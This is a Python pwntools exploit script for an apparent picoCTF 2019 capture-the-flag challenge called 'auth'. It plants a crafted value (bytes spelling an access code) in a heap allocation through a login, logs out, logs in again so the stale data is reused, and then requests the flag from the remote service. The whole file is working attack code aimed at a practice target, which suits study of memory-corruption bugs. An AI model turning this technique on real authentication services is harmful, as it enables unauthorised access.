#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./auth"

rhp1 = {'host':"2019shell1.picoctf.com",'port':45173}
rhp2 = {"host":"localhost","port":12900}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def login(conn,length,name):
  conn.recvuntil("> ")
  conn.sendline("login")
  conn.recvuntil("username\n")
  conn.sendline(str(length))
  conn.recvuntil("username\n")
  conn.sendline(name)

def logout(conn):
  conn.recvuntil("> ")
  conn.sendline("logout")

def printflag(conn):
  conn.recvuntil("> ")
  conn.sendline("print-flag")

def exploit(conn):
  login(conn,0x20,"A"*8+pack(0x4343415f544f4f52)+pack(0x45444f435f535345))
  logout(conn)
  login(conn,0x50,"B"*8)
  printflag(conn)

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

